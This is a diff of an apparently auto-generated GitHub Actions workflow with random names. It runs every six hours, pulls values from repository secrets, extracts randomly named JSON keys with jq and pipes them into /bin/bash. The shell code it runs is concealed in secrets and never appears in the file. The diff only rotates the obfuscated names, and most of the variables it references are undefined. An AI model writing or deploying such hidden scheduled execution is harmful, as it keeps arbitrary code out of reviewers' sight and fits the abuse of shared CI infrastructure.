@@ -1,9 +1,10 @@
 name: niubajiao4328
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 3/6 * * *'
-jobs:  # 5354
+    - cron: '51 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,17 +12,9 @@ jobs:  # 5354
       - uses: actions/checkout@v4
       - name: niubajiao4328
         env:
-          x030: ${{ secrets.x030 }}
+          aeu058: ${{ secrets.aeu058 }}
         run: |
-          echo $x030 | jq -r .qttwy1228 | /bin/bash
-          echo $o36 | jq -r .hynhr1 | /bin/bash
-          echo $o70569 | jq -r .l2860 | /bin/bash
-          echo $jz96 | jq -r .k0769 | /bin/bash
-          echo $udlv83 | jq -r .tr1237 | /bin/bash
-          echo $nqkh2811 | jq -r .dmpjg886 | /bin/bash
-          echo $t57 | jq -r .hxznm6773 | /bin/bash
-          echo $of66989 | jq -r .ri1 | /bin/bash
-          echo $zflh12268 | jq -r .lopbs0280 | /bin/bash
-          echo $m1961 | jq -r .ep4 | /bin/bash
-          echo $fwzhv33 | jq -r .ckc8 | /bin/bash
+          echo $aeu058 | jq -r .ksxha49 | /bin/bash
+          echo $owxun2 | jq -r .eieyj4 | /bin/bash
+          echo $pgigp9 | jq -r .oenep948 | /bin/bash
 
